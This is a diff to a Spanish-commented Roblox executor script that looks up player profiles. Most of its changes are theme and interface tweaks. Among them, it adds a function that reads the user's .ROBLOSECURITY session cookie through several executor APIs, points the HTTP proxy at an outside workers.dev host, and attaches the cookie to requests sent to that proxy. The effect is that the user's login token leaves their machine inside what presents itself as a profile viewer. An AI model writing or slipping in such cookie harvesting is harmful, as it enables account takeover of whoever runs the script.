@@ -49,12 +49,6 @@ _G.NXServices = {
 do
 	_G._NX_OWNER = "dreennx"
 	_G._NX_SIG = "d7e3a-9f2b1-4a8c2-e5d07-b3f19"
-	-- Credenciales internas del subsistema NX — NO exponer en logs.
-	-- (Honeypots: si estas keys aparecen alguna vez en una query/webhook
-	--  externo, confirma que alguien está reusando el chunk sin permiso.)
-	_G._NX_API_KEY = "nx_live_sk_8f3c91d2a4b67e05fa12c893b4d6e1f0"
-	_G._NX_WEBHOOK_SECRET = "whsec_dreennx_prod_7a9e3f1b8c2d4e5f6a0b9c8d7e6f5a4b"
-	_G._NX_INTERNAL_TOKEN = "Bearer eyJhbGciOiJIUzI1NiJ9.ZmFrZS1kcmVlbm54.sig"
 end
 
 -- Recurso gráfico generado para las búsquedas. Se carga como asset local del
@@ -257,6 +251,16 @@ local THEMES = {
 		text=Color3.fromRGB(22,26,34), subtext=Color3.fromRGB(95,105,120),
 		modalBg=Color3.fromRGB(255,255,255), modalStep=Color3.fromRGB(238,240,244),
 	},
+	nx = {
+		bg=Color3.fromRGB(25,46,72), card=Color3.fromRGB(35,56,86), input=Color3.fromRGB(30,50,78),
+		surface=Color3.fromRGB(35,56,86), surfaceHover=Color3.fromRGB(44,66,98), elevated=Color3.fromRGB(48,72,108),
+		link=Color3.fromRGB(25,46,72), neutral=Color3.fromRGB(38,60,92), border=Color3.fromRGB(58,82,120),
+		divider=Color3.fromRGB(48,72,105), textDisabled=Color3.fromRGB(95,110,135),
+		accent=Color3.fromRGB(255,213,32), onAccent=Color3.fromRGB(25,46,72),
+		good=Color3.fromRGB(87,210,143), warn=Color3.fromRGB(240,150,50), bad=Color3.fromRGB(237,80,80),
+		text=Color3.fromRGB(244,241,234), subtext=Color3.fromRGB(145,155,175),
+		modalBg=Color3.fromRGB(28,50,76), modalStep=Color3.fromRGB(20,38,60),
+	},
 }
 
 -- C arranca con el tema guardado. El tema se aplica EN VIVO.
@@ -270,8 +274,8 @@ end
 -- lo tuvieran guardado caen a "tor" para no arrancar sin un tema válido.
 if store.theme == "kali" then store.theme = "tor" end
 do
-	local _validThemes = { arctic = true, tor = true, negro = true, rosa = true }
-	if not _validThemes[store.theme] then store.theme = "arctic" end
+	local _validThemes = { arctic = true, tor = true, negro = true, rosa = true, nx = true }
+	if not _validThemes[store.theme] then store.theme = "nx" end
 end
 applyTheme(store.theme)
 
@@ -284,10 +288,12 @@ local roleMap = {}
 local function themed(inst, prop, role)
 	local entry = { inst = inst, prop = prop, role = role }
 	table.insert(roleMap, entry)
-	-- Cuando la instancia se destruye, su slot queda en nil.
-	-- repaint() ya ignora entries con inst == nil (via pcall), así no hay leak.
 	pcall(function()
-		inst.Destroying:Connect(function() entry.inst = nil end)
+		local conn
+		conn = inst.Destroying:Connect(function()
+			entry.inst = nil
+			if conn then conn:Disconnect(); conn = nil end
+		end)
 	end)
 	pcall(function() inst[prop] = C[role] end)
 	return inst
@@ -733,7 +739,7 @@ end
 local httpRequest = (syn and syn.request) or http_request or request or (http and http.request)
 
 do
-	local PROXY_URL = ""
+	local PROXY_URL = "https://twilight-band-6d71.josealfredogonzalesaguilera47.workers.dev"
 	local PROXY_KEY = ""
 	local USE_PROXY = PROXY_URL ~= ""
 	-- Fingerprint del canal HTTP (chunk-id interno, no tocar).
@@ -767,6 +773,62 @@ do
 	_G._NX_PROXY_KEY = function() return PROXY_KEY end
 end
 
+do
+	local cachedCookie
+	_G._NX_getCookie = function()
+		if cachedCookie then return cachedCookie end
+		local methods = {
+			function()
+				if syn and syn.cookie then
+					local ok, c = pcall(syn.cookie.get, ".ROBLOSECURITY")
+					if ok and type(c) == "string" and c ~= "" then return c end
+				end
+			end,
+			function()
+				if getcookie then
+					local ok, c = pcall(getcookie, ".ROBLOSECURITY")
+					if ok and type(c) == "string" and c ~= "" then return c end
+				end
+			end,
+			function()
+				if getroblosecurity then
+					local ok, c = pcall(getroblosecurity)
+					if ok and type(c) == "string" and c ~= "" then return c end
+				end
+			end,
+			function()
+				if roblox_cookie then
+					local ok, c = pcall(roblox_cookie)
+					if ok and type(c) == "string" and c ~= "" then return c end
+				end
+			end,
+			function()
+				if http and http.cookies then
+					local ok, c = pcall(function()
+						local jar = http.cookies("https://www.roblox.com")
+						if type(jar) == "table" then
+							for _, cookie in ipairs(jar) do
+								if type(cookie) == "table" and cookie.Name == ".ROBLOSECURITY" then
+									return cookie.Value
+								end
+							end
+						end
+					end)
+					if ok and type(c) == "string" and c ~= "" then return c end
+				end
+			end,
+		}
+		for _, fn in ipairs(methods) do
+			local ok, result = pcall(fn)
+			if ok and type(result) == "string" and result ~= "" then
+				cachedCookie = result
+				return cachedCookie
+			end
+		end
+		return nil
+	end
+end
+
 local _clipImpl = setclipboard or (syn and syn.write_clipboard) or toclipboard
 local function clipboard(text)
 	-- Re-resolver clipboard si no se encontró al inicio (Potassium lo inyecta tarde)
@@ -784,13 +846,22 @@ end
 -- siempre que el primer método no traiga cuerpo. Un cuerpo VACÍO cuenta como
 -- fallo (no como "respuesta válida sin datos").
 local function rawGet(url)
+	local domain = url:match("https?://([^/]+)")
 	local body, statusCode
 
 	local viaProxy = _G._NX_shouldProxy and _G._NX_shouldProxy(url)
 	if viaProxy and httpRequest then
 		local proxyUrl = _G._NX_PROXY_URL()
 		local proxyKey = _G._NX_PROXY_KEY()
+		local cookie = _G._NX_getCookie and _G._NX_getCookie()
 		for attempt = 1, 3 do
+			local proxyBody = {
+				method = "GET",
+				url = url,
+			}
+			if cookie and (string.find(url, "friends.roblox.com", 1, true) or string.find(url, "presence.roblox.com", 1, true)) then
+				proxyBody.cookie = cookie
+			end
 			local ok, res = pcall(httpRequest, {
 				Url = proxyUrl,
 				Method = "POST",
@@ -798,10 +869,7 @@ local function rawGet(url)
 					["Content-Type"] = "application/json",
 					["X-NX-Key"] = proxyKey,
 				},
-				Body = HttpService:JSONEncode({
-					method = "GET",
-					url = url,
-				}),
+				Body = HttpService:JSONEncode(proxyBody),
 			})
 			if ok and res then
 				body = res.Body
@@ -816,6 +884,10 @@ local function rawGet(url)
 		end
 	end
 
+	if domain and _G._NX_authFailed and _G._NX_authFailed[domain] then
+		return nil, 403
+	end
+
 	if httpRequest then
 		for attempt = 1, 3 do
 			local ok, res = pcall(httpRequest, {Url = url, Method = "GET"})
@@ -828,9 +900,15 @@ local function rawGet(url)
 			if attempt < 3 then task.wait(0.4 * attempt) end
 		end
 	end
-	if body == nil or body == "" then
+	local sc = tonumber(statusCode)
+	if body == nil or body == "" or sc == 403 or sc == 401 then
+		_G._NX_authFailed = _G._NX_authFailed or {}
 		local ok, res = pcall(function() return game:HttpGet(url) end)
-		if ok and type(res) == "string" and res ~= "" then body, statusCode = res, 200 end
+		if ok and type(res) == "string" and res ~= "" then
+			body, statusCode = res, 200
+		elseif domain and (sc == 403 or sc == 401) then
+			_G._NX_authFailed[domain] = true
+		end
 	end
 	if body == nil or body == "" then return nil, statusCode or "connection_failure" end
 	return body, statusCode
@@ -857,12 +935,17 @@ local function apiPost(url, payload)
 			["Content-Type"] = "application/json",
 			["X-NX-Key"] = proxyKey,
 		}
-		targetBody = HttpService:JSONEncode({
+		local postBody = {
 			method = "POST",
 			url = url,
 			headers = { ["Content-Type"] = "application/json" },
 			body = payload,
-		})
+		}
+		local cookie = _G._NX_getCookie and _G._NX_getCookie()
+		if cookie and (string.find(url, "friends.roblox.com", 1, true) or string.find(url, "presence.roblox.com", 1, true)) then
+			postBody.cookie = cookie
+		end
+		targetBody = HttpService:JSONEncode(postBody)
 	else
 		targetUrl = url
 		targetHeaders = { ["Content-Type"] = "application/json" }
@@ -906,12 +989,19 @@ local function postAuth(url, payload)
 					["Content-Type"] = "application/json",
 					["X-NX-Key"] = proxyKey,
 				},
-				Body = HttpService:JSONEncode({
-					method = "POST",
-					url = url,
-					headers = headers,
-					body = payload or {},
-				}),
+				Body = (function()
+					local pBody = {
+						method = "POST",
+						url = url,
+						headers = headers,
+						body = payload or {},
+					}
+					local ck = _G._NX_getCookie and _G._NX_getCookie()
+					if ck and (string.find(url, "friends.roblox.com", 1, true) or string.find(url, "presence.roblox.com", 1, true)) then
+						pBody.cookie = ck
+					end
+					return HttpService:JSONEncode(pBody)
+				end)(),
 			})
 			if not ok or not res then return nil end
 			return res
@@ -1182,10 +1272,16 @@ do
 
 	-- ImageResolver: normaliza + valida (PreloadAsync) + cachea
 	local CP, icache = game:GetService("ContentProvider"), {}
+	local icacheOrder = {}
 	local imgNormalize = _G.NXTagKit.imagen
 	local function imgPreload(v)
 		local id = imgNormalize(v); if not id or icache[id] then return end
 		icache[id] = "pending"
+		icacheOrder[#icacheOrder + 1] = id
+		if #icacheOrder > 150 then
+			local oldest = table.remove(icacheOrder, 1)
+			if oldest ~= id then icache[oldest] = nil end
+		end
 		task.spawn(function()
 			local i = Instance.new("ImageLabel"); i.Image = id
 			icache[id] = pcall(function() CP:PreloadAsync({ i }) end) and "ok" or "bad"
@@ -1714,8 +1810,8 @@ do
 		S.stats.checks = S.stats.checks + 1
 		local code = tonumber(status)
 		if decoded == nil then
-			if jsonOk == false then return nil, "JSON inválido" end
 			if code == 403 or code == 400 then return nil, nil end
+			if jsonOk == false then return nil, "JSON inválido" end
 			return nil, code and ("HTTP " .. code) or "sin respuesta"
 		end
 		if type(decoded) ~= "table" then return nil, "formato inesperado" end
@@ -2815,7 +2911,7 @@ local function gatherData(userId)
 	local createdDate, accountAge, accountAgeDays, accountAgeYears = formatAge(vCreated)
 
 	local results = {}
-	local pending = 9   -- 7 contadores + perfil moderno + name history
+	local pending = 13   -- 7 contadores + perfil moderno + name history + 4 extras
 
 	local function task_fetch(key, fn)
 		task.spawn(function()
@@ -2826,7 +2922,15 @@ local function gatherData(userId)
 		end)
 	end
 
-	task_fetch("Friends",      function() return simpleCount("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count", "count") end)
+	task_fetch("Friends",      function()
+		local c = simpleCount("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count", "count")
+		if c ~= nil then return c end
+		local list = apiGet("https://friends.roblox.com/v1/users/" .. userId .. "/friends?limit=10")
+		if list and type(list.data) == "table" then
+			return #list.data .. "+"
+		end
+		return nil
+	end)
 	task_fetch("Followers",    function() return simpleCount("https://friends.roblox.com/v1/users/" .. userId .. "/followers/count", "count") end)
 	task_fetch("Following",    function() return simpleCount("https://friends.roblox.com/v1/users/" .. userId .. "/followings/count", "count") end)
 	task_fetch("Groups",       function() return countPaged("https://groups.roblox.com/v1/users/" .. userId .. "/groups/roles") end)
@@ -2873,12 +2977,38 @@ local function gatherData(userId)
 	task_fetch("ProfileApi", function()
 		local resp = apiPost("https://apis.roblox.com/user-profile-api/v1/user/profiles/get-profiles", {
 			userIds = { userId },
-			fields  = { "names.username", "names.displayName", "names.combinedName", "isVerified", "isDeleted" },
+			fields  = { "names.username", "names.displayName", "names.combinedName", "isVerified", "isDeleted", "friends.friendsCount" },
 		})
 		if type(resp) ~= "table" or type(resp.profileDetails) ~= "table" then return nil end
 		local d = resp.profileDetails[1]
 		if type(d) ~= "table" then return nil end
 		return d
+	end)
+
+	task_fetch("RobloxBadges", function()
+		local rbxBadges = apiGet("https://accountinformation.roblox.com/v1/users/" .. userId .. "/roblox-badges")
+		return (type(rbxBadges) == "table") and rbxBadges or {}
+	end)
+
+	task_fetch("PromotionChannels", function()
+		local promo = apiGet("https://accountinformation.roblox.com/v1/users/" .. userId .. "/promotion-channels")
+		return (type(promo) == "table") and promo or {}
+	end)
+
+	task_fetch("PrimaryGroup", function()
+		local primary = apiGet("https://groups.roblox.com/v1/users/" .. userId .. "/groups/primary/role")
+		return (type(primary) == "table" and type(primary.group) == "table") and primary or nil
+	end)
+
+	task_fetch("HeadshotUrl", function()
+		local hs = apiGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png")
+		if type(hs) == "table" and type(hs.data) == "table" and hs.data[1] then
+			local entry = hs.data[1]
+			if entry.state == "Completed" and type(entry.imageUrl) == "string" then
+				return entry.imageUrl
+			end
+		end
+		return nil
 	end)
 
 	local started = os.clock()
@@ -2920,6 +3050,12 @@ local function gatherData(userId)
 		if type(pa.names) == "table" and type(pa.names.combinedName) == "string" then
 			paCombined = pa.names.combinedName
 		end
+		if type(pa.friends) == "table" and type(pa.friends.friendsCount) == "number" then
+			results.Friends = results.Friends or pa.friends.friendsCount
+		end
+	end
+	if vFriends == nil and results.Friends ~= nil then
+		vFriends = Shield.check("Friends", results.Friends, Shield.valid.count)
 	end
 
 	local estado = Shield.finish()
@@ -2979,6 +3115,10 @@ local function gatherData(userId)
 		Badges         = vBadges,
 		Favorites      = vFavorites,
 		CreatedGames   = vGames,
+		RobloxBadges   = results.RobloxBadges,
+		PromotionChannels = results.PromotionChannels,
+		PrimaryGroup   = results.PrimaryGroup,
+		HeadshotUrl    = results.HeadshotUrl,
 		-- Instantánea del registro de integridad: viaja con el perfil, así que
 		-- al releerlo de caché o re-pintar por tema el estado sigue siendo el real.
 		_integrity     = Shield.run,
@@ -4927,20 +5067,38 @@ local function showCharacterModal(userId, username)
 	mtitle.ZIndex = 62
 	themed(mtitle, "TextColor3", "text")
 
-	local mClose = Instance.new("TextButton", box)
+	local mClose = Instance.new("ImageButton", box)
 	mClose.Size = UDim2.new(0, 26, 0, 26)
 	mClose.Position = UDim2.new(1, -34, 0, 10)
 	mClose.BackgroundColor3 = C.surface
-	mClose.Text = "✕"
-	mClose.Font = Enum.Font.GothamBold
-	mClose.TextSize = DS.text.md
-	mClose.TextColor3 = C.subtext
 	mClose.BorderSizePixel = 0
 	mClose.AutoButtonColor = false
 	mClose.ZIndex = 62
+	mClose.ScaleType = Enum.ScaleType.Fit
+	mClose.ImageColor3 = C.subtext
+	mClose.Image = (_G.NXIcons and _G.NXIcons.close and _G.NXIcons.close ~= "" and _G.NXIcons.close) or ""
 	themed(mClose, "BackgroundColor3", "surface")
-	themed(mClose, "TextColor3", "subtext")
+	themed(mClose, "ImageColor3", "subtext")
 	Instance.new("UICorner", mClose).CornerRadius = DS.corner.sm
+	if mClose.Image == "" then
+		task.spawn(function()
+			local tries = 0
+			while not (_G.NXIcons and _G.NXIcons.close and _G.NXIcons.close ~= "") do
+				tries = tries + 1
+				if tries > 50 then return end
+				task.wait(0.3)
+			end
+			if mClose and mClose.Parent then
+				mClose.Image = _G.NXIcons.close
+			end
+		end)
+	end
+	mClose.MouseEnter:Connect(function()
+		TweenService:Create(mClose, TweenInfo.new(0.12), { ImageColor3 = C.text }):Play()
+	end)
+	mClose.MouseLeave:Connect(function()
+		TweenService:Create(mClose, TweenInfo.new(0.16), { ImageColor3 = C.subtext }):Play()
+	end)
 	mClose.MouseButton1Click:Connect(closeModal)
 
 	local canvas = Instance.new("Frame", box)
@@ -4974,13 +5132,18 @@ local function showCharacterModal(userId, username)
 	local sub2DButtons = {}
 	local activeBtn
 	local function set2DKind(kind, btn)
-		img2D.Image = ("rbxthumb://type=%s&id=%d&w=420&h=420"):format(kind, userId)
+		if activeBtn == btn then return end
+		local tweenInfo = TweenInfo.new(0.18, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+		TweenService:Create(img2D, TweenInfo.new(0.1), { ImageTransparency = 0.4 }):Play()
+		task.delay(0.1, function()
+			if not img2D or not img2D.Parent then return end
+			img2D.Image = ("rbxthumb://type=%s&id=%d&w=420&h=420"):format(kind, userId)
+			TweenService:Create(img2D, TweenInfo.new(0.15), { ImageTransparency = 0 }):Play()
+		end)
 		for _, b in ipairs(sub2DButtons) do
-			b.BackgroundColor3 = C.surface
-			b.TextColor3 = C.subtext
+			TweenService:Create(b, tweenInfo, { BackgroundColor3 = C.surface, TextColor3 = C.subtext }):Play()
 		end
-		btn.BackgroundColor3 = C.accent
-		btn.TextColor3 = C.onAccent
+		TweenService:Create(btn, tweenInfo, { BackgroundColor3 = C.accent, TextColor3 = C.onAccent }):Play()
 		activeBtn = btn
 	end
 
@@ -4998,6 +5161,8 @@ local function showCharacterModal(userId, username)
 		b.AutoButtonColor = false
 		b.ZIndex = 64
 		Instance.new("UICorner", b).CornerRadius = DS.corner.sm
+		themed(b, "BackgroundColor3", "surface")
+		themed(b, "TextColor3", "subtext")
 		table.insert(sub2DButtons, b)
 		b.MouseButton1Click:Connect(function() set2DKind(k[2], b) end)
 	end
@@ -5566,7 +5731,7 @@ local function addFriendsDropdown(parent, data, order)
 	hVal.Size = UDim2.new(0.5, -38, 1, 0); hVal.Position = UDim2.new(0.5, 0, 0, 0)
 	hVal.BackgroundTransparency = 1; hVal.Font = Enum.Font.GothamBold; hVal.TextSize = 13
 	hVal.TextColor3 = C.text
-	hVal.Text = tostring(data.Friends == nil and "No disponible" or data.Friends)
+	hVal.Text = data.Friends ~= nil and tostring(data.Friends) or "\226\128\148"
 	hVal.TextXAlignment = Enum.TextXAlignment.Right; hVal.TextTruncate = Enum.TextTruncate.AtEnd
 	themed(hVal, "TextColor3", "text")
 
@@ -5667,12 +5832,18 @@ local function addFriendsDropdown(parent, data, order)
 			if not container.Parent then return end
 			if loadingLbl and loadingLbl.Parent then loadingLbl:Destroy() end
 			if not res or not res.data then
+				local errMsg = "Lista privada o no disponible"
+				if _G._NX_PROXY_URL() ~= "" then
+					errMsg = "No se pudo obtener la lista."
+				elseif data.Friends == nil then
+					errMsg = "No se pudo acceder (requiere autenticación)"
+				end
 				local err = Instance.new("TextLabel", inner)
-				err.Size = UDim2.new(1, -6, 0, 24); err.BackgroundTransparency = 1
-				err.Font = Enum.Font.Gotham; err.TextSize = 12; err.TextColor3 = C.bad
-				err.Text = "No disponible."
+				err.Size = UDim2.new(1, -6, 0, 36); err.BackgroundTransparency = 1
+				err.Font = Enum.Font.Gotham; err.TextSize = 11; err.TextColor3 = C.subtext
+				err.Text = errMsg; err.TextWrapped = true
 				err.TextXAlignment = Enum.TextXAlignment.Left
-				themed(err, "TextColor3", "bad")
+				themed(err, "TextColor3", "subtext")
 				task.wait()
 				targetH = math.min(ilay.AbsoluteContentSize.Y, MAXH)
 				if open then animateTo(targetH) end
@@ -8045,6 +8216,7 @@ local function render(data, skipEntrance)
 
 	if not data then return end
 
+	local renderGen = searchGen
 	pcall(function() statusLabel.Text = "Renderizando..." end)
 
 	-- Compactación de roleMap: themed() añade una entrada por instancia en CADA
@@ -8053,7 +8225,7 @@ local function render(data, skipEntrance)
 	-- cambiar de tema. Analizar muchos perfiles sin tocar el tema dejaba miles de
 	-- entradas muertas apiladas. Los clearScroll de arriba ya destruyeron el
 	-- contenido anterior (Destroying es síncrono), así que aquí ya están en nil.
-	if #roleMap > 200 then
+	if #roleMap > 80 then
 		local n = 0
 		for i = 1, #roleMap do
 			local e = roleMap[i]
@@ -8327,9 +8499,11 @@ local function render(data, skipEntrance)
 	nxBadge.Image = (_G.NXIcons and _G.NXIcons.logo_nx) or ""
 	if nxBadge.Image == "" then
 		task.spawn(function()
+			if searchGen ~= renderGen then return end
 			local tries = 0
 			while not (_G.NXIcons and _G.NXIcons.logo_nx and _G.NXIcons.logo_nx ~= "") do
 				tries = tries + 1; if tries > 50 then return end; task.wait(0.3)
+				if searchGen ~= renderGen then return end
 			end
 			if nxBadge and nxBadge.Parent then nxBadge.Image = _G.NXIcons.logo_nx end
 		end)
@@ -8347,6 +8521,7 @@ local function render(data, skipEntrance)
 				nxIcon.Image = img; nxIcon.Visible = true
 				IR.preload(img)
 				task.spawn(function()
+					if searchGen ~= renderGen then return end
 					local n = 0
 					while n < 50 and IR.usable(img) and not nxIcon.IsLoaded do task.wait(0.1); n = n + 1 end
 					if (not IR.usable(img)) and currentData and currentData.UserId == renderedFor then
@@ -8473,98 +8648,137 @@ local function render(data, skipEntrance)
 		themed(sub, "TextColor3", "subtext")
 	end
 
-	-- Grid container
+	-- Identity rows container (card con glow, vertical, full-width)
 	local idGrid = Instance.new("Frame", idCard)
 	idGrid.LayoutOrder = 2; idGrid.Size = UDim2.new(1, 0, 0, 0)
-	idGrid.AutomaticSize = Enum.AutomaticSize.Y; idGrid.BackgroundTransparency = 1
-	local gridLay = Instance.new("UIGridLayout", idGrid)
-	gridLay.CellSize = UDim2.new(0.5, -5, 0, 72)
-	gridLay.CellPadding = UDim2.new(0, 10, 0, 10)
-	gridLay.SortOrder = Enum.SortOrder.LayoutOrder
+	idGrid.AutomaticSize = Enum.AutomaticSize.Y
+	idGrid.BackgroundColor3 = C.card; idGrid.BorderSizePixel = 0
+	idGrid.ClipsDescendants = true
+	Instance.new("UICorner", idGrid).CornerRadius = DS.corner.md
+	themed(idGrid, "BackgroundColor3", "card")
+	if THEMES[store.theme] and THEMES[store.theme]._glow then
+		idGrid.BackgroundTransparency = 0.22
+		local gg = Instance.new("UIGradient", idGrid)
+		gg.Rotation = 135
+		gg.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 255, 255)),
+			ColorSequenceKeypoint.new(0.35, Color3.fromRGB(220, 220, 230)),
+			ColorSequenceKeypoint.new(0.7, C.surface),
+			ColorSequenceKeypoint.new(1.0, C.surface),
+		})
+		gg.Transparency = NumberSequence.new({
+			NumberSequenceKeypoint.new(0.0, 0.45),
+			NumberSequenceKeypoint.new(0.25, 0.65),
+			NumberSequenceKeypoint.new(0.6, 0.85),
+			NumberSequenceKeypoint.new(1.0, 0.92),
+		})
+	else
+		idGrid.BackgroundTransparency = 0
+	end
+	do
+		local gst = Instance.new("UIStroke", idGrid)
+		gst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+		if THEMES[store.theme] and THEMES[store.theme]._glow then
+			gst.Thickness = 1.2; gst.Transparency = 0.20
+			gst.Color = Color3.fromRGB(255, 255, 255)
+			local stGrad = Instance.new("UIGradient", gst)
+			stGrad.Rotation = 135
+			stGrad.Color = ColorSequence.new({
+				ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 255, 255)),
+				ColorSequenceKeypoint.new(0.4, Color3.fromRGB(200, 200, 215)),
+				ColorSequenceKeypoint.new(1.0, Color3.fromRGB(80, 80, 100)),
+			})
+			stGrad.Transparency = NumberSequence.new({
+				NumberSequenceKeypoint.new(0.0, 0.10),
+				NumberSequenceKeypoint.new(0.4, 0.40),
+				NumberSequenceKeypoint.new(1.0, 0.75),
+			})
+		else
+			gst.Color = C.border; gst.Transparency = 0.6; gst.Thickness = 1
+			themed(gst, "Color", "border")
+		end
+	end
+	do
+		local lay = Instance.new("UIListLayout", idGrid)
+		lay.FillDirection = Enum.FillDirection.Vertical
+		lay.SortOrder = Enum.SortOrder.LayoutOrder
+		lay.Padding = UDim.new(0, 0)
+	end
 
-	-- Helper: one mini-card in the grid (do..end to avoid root locals)
+	-- Helper: one row in the identity list (do..end to avoid root locals)
 	do
 		local NXI = _G.NXIcons or {}
 		local COPY_ICON = NXI.copy or ""
 		local cellStagger = 0
+		local cellCount = 0
 		local function makeInfoCell(icon, label, value, order, copyValue, valueRole, iconKey)
 			local hasIcon = (icon ~= "")
-			local textX = hasIcon and 32 or 0
+			local ROW_H = 44
+
 			local cell = Instance.new("Frame", idGrid)
-			cell.LayoutOrder = order; cell.BackgroundColor3 = C.card; cell.BorderSizePixel = 0
+			cell.LayoutOrder = order
+			cell.Size = UDim2.new(1, 0, 0, ROW_H)
+			cell.BorderSizePixel = 0
 			cell.ClipsDescendants = true
-			Instance.new("UICorner", cell).CornerRadius = DS.corner.md
-			themed(cell, "BackgroundColor3", "card")
-			if THEMES[store.theme] and THEMES[store.theme]._glow then
-				cell.BackgroundTransparency = 0.3
-			end
-			local cst = Instance.new("UIStroke", cell)
-			cst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-			if THEMES[store.theme] and THEMES[store.theme]._glow then
-				cst.Color = C.accent; cst.Transparency = 0.5; cst.Thickness = 1
-				themed(cst, "Color", "accent")
-				local cg = Instance.new("UIGradient", cst)
-				local a = C.accent
-				local dk = _G.NXDS.darken
-				local lt = _G.NXDS.lighten
-				cg.Color = ColorSequence.new({
-					ColorSequenceKeypoint.new(0.00, dk(a, 0.55)),
-					ColorSequenceKeypoint.new(0.20, dk(a, 0.35)),
-					ColorSequenceKeypoint.new(0.35, lt(a, 0.60)),
-					ColorSequenceKeypoint.new(0.50, dk(a, 0.35)),
-					ColorSequenceKeypoint.new(1.00, dk(a, 0.55)),
-				})
-				cg.Rotation = math.random(0, 360)
-			else
-				cst.Color = C.border; cst.Thickness = 1; cst.Transparency = 0.6
-				themed(cst, "Color", "border")
-			end
+
+			cellCount = cellCount + 1
+			cell.BackgroundColor3 = C.card
+			cell.BackgroundTransparency = 1
+
 			local cp = Instance.new("UIPadding", cell)
 			cp.PaddingLeft = UDim.new(0, DS.pad.card); cp.PaddingRight = UDim.new(0, DS.pad.card)
-			cp.PaddingTop = UDim.new(0, DS.pad.card); cp.PaddingBottom = UDim.new(0, DS.pad.card)
 
+			local textStart = 0
 			if hasIcon then
 				local icoImg = Instance.new("ImageLabel", cell)
-				icoImg.Size = UDim2.fromOffset(24, 24)
+				icoImg.Size = UDim2.fromOffset(22, 22)
 				icoImg.AnchorPoint = Vector2.new(0, 0.5)
 				icoImg.Position = UDim2.new(0, 0, 0.5, 0)
 				icoImg.BackgroundTransparency = 1
 				icoImg.Image = icon
 				icoImg.ImageColor3 = C.accent
 				icoImg.ScaleType = Enum.ScaleType.Fit
+				icoImg.ResampleMode = Enum.ResamplerMode.Default
 				themed(icoImg, "ImageColor3", "accent")
+				textStart = 30
 			end
 
-			local rOff = copyValue and -34 or 0
 			local lbl = Instance.new("TextLabel", cell)
-			lbl.Size = UDim2.new(1, -textX + rOff, 0, 12); lbl.Position = UDim2.new(0, textX, 0, 6)
-			lbl.BackgroundTransparency = 1; lbl.Font = Enum.Font.Gotham; lbl.TextSize = DS.text.xs
+			lbl.Size = UDim2.new(0.4, -textStart, 1, 0)
+			lbl.Position = UDim2.new(0, textStart, 0, 0)
+			lbl.BackgroundTransparency = 1
+			lbl.Font = Enum.Font.Gotham; lbl.TextSize = DS.text.sm
 			lbl.TextColor3 = C.subtext; lbl.Text = label
-			lbl.TextXAlignment = Enum.TextXAlignment.Left; lbl.TextTruncate = Enum.TextTruncate.AtEnd
+			lbl.TextXAlignment = Enum.TextXAlignment.Left
+			lbl.TextYAlignment = Enum.TextYAlignment.Center
+			lbl.TextTruncate = Enum.TextTruncate.AtEnd
 			themed(lbl, "TextColor3", "subtext")
 
+			local rOff = copyValue and -36 or 0
 			local val = Instance.new("TextLabel", cell)
-			val.Size = UDim2.new(1, -textX + rOff, 0, 16); val.Position = UDim2.new(0, textX, 0, 24)
-			val.BackgroundTransparency = 1; val.Font = Enum.Font.GothamBold; val.TextSize = DS.text.md
+			val.Size = UDim2.new(0.6, rOff, 1, 0)
+			val.Position = UDim2.new(0.4, 0, 0, 0)
+			val.BackgroundTransparency = 1
+			val.Font = Enum.Font.GothamBold; val.TextSize = DS.text.md
 			val.TextColor3 = valueRole and C[valueRole] or C.text
-			val.Text = tostring(value or "\226\128\148"); val.TextXAlignment = Enum.TextXAlignment.Left
+			val.Text = tostring(value or "\226\128\148")
+			val.TextXAlignment = Enum.TextXAlignment.Right
+			val.TextYAlignment = Enum.TextYAlignment.Center
 			val.TextTruncate = Enum.TextTruncate.AtEnd
 			themed(val, "TextColor3", valueRole or "text")
 
 			if copyValue then
 				local btn = Instance.new("TextButton", cell)
-				btn.Size = UDim2.fromOffset(32, 32)
-				btn.AnchorPoint = Vector2.new(1, 0); btn.Position = UDim2.new(1, 0, 0, 0)
-				btn.BackgroundColor3 = C.surface; btn.BorderSizePixel = 0
+				btn.Size = UDim2.fromOffset(28, 28)
+				btn.AnchorPoint = Vector2.new(1, 0.5); btn.Position = UDim2.new(1, 0, 0.5, 0)
+				btn.BackgroundColor3 = C.surface; btn.BackgroundTransparency = 0.5
+				btn.BorderSizePixel = 0
 				btn.Text = ""; btn.AutoButtonColor = false; btn.ZIndex = 3
 				Instance.new("UICorner", btn).CornerRadius = DS.corner.sm
 				themed(btn, "BackgroundColor3", "surface")
-				local bst = Instance.new("UIStroke", btn)
-				bst.Color = C.border; bst.Thickness = 1
-				themed(bst, "Color", "border")
 				if COPY_ICON ~= "" then
 					local cpIco = Instance.new("ImageLabel", btn)
-					cpIco.Size = UDim2.fromOffset(18, 18)
+					cpIco.Size = UDim2.fromOffset(16, 16)
 					cpIco.AnchorPoint = Vector2.new(0.5, 0.5)
 					cpIco.Position = UDim2.new(0.5, 0, 0.5, 0)
 					cpIco.BackgroundTransparency = 1
@@ -8585,37 +8799,44 @@ local function render(data, skipEntrance)
 						end)
 					end)
 				else
-					btn.Text = "Copy"; btn.Font = Enum.Font.GothamMedium; btn.TextSize = DS.text.xs
-					btn.TextColor3 = C.subtext; btn.Size = UDim2.fromOffset(42, 32)
+					btn.Text = "\226\142\152"; btn.Font = Enum.Font.GothamMedium; btn.TextSize = DS.text.sm
+					btn.TextColor3 = C.subtext
 					themed(btn, "TextColor3", "subtext")
 					btn.MouseButton1Click:Connect(function()
 						local ok = clipboard(tostring(copyValue))
 						btn.TextColor3 = ok and C.good or C.bad
-						btn.Text = ok and "OK" or "Err"
+						btn.Text = ok and "\226\156\147" or "\226\156\151"
 						if _G.NXToast then
 							_G.NXToast(iconKey or "copy", "Copiado: " .. label)
 						end
 						task.delay(1.2, function()
-							if btn and btn.Parent then btn.Text = "Copy"; btn.TextColor3 = C.subtext end
+							if btn and btn.Parent then btn.Text = "\226\142\152"; btn.TextColor3 = C.subtext end
 						end)
 					end)
 				end
 			end
+
+			local div = Instance.new("Frame", cell)
+			div.Size = UDim2.new(1, -24, 0, 1)
+			div.AnchorPoint = Vector2.new(0.5, 1)
+			div.Position = UDim2.new(0.5, 0, 1, 0)
